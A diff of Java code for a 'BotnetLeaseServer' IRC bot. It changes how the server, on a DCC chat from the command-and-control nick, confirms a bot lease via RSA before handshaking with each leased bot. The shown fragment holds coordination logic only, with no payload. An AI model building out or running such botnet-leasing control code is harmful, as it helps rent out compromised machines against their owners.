@@ -110,7 +110,6 @@ public class BotnetLeaseServer extends PircBot {
 		}
 	}
 	
-	@Override
 	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
 		System.out.println(sender + ": " + message);
 	}
@@ -172,7 +171,6 @@ public class BotnetLeaseServer extends PircBot {
 		}
 	}
 	
-	@Override
 	protected void onIncomingChatRequest(DccChat chat) {
 		System.out.println("incoming chat request from " + chat.getNick());
 		if (chat.getNick().equals(CC)) {
@@ -188,12 +186,16 @@ public class BotnetLeaseServer extends PircBot {
 						leasedM.getRSAPair();
 						chat.sendLine(leasedM.getRSAPubInfo());
 						//Allow time for the leasing to take place
-						this.wait(3000);
-						for (String name : leasedBots) {
-							handshake(name);
+						//this.wait(3000);
+						String done = m.decryptRSA(chat.readLine());
+						if (done.equals("leased")) {
+							for (String name : leasedBots) {
+								handshake(name);
+							}
 						}
 					}
 				}
+				chat.close();
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
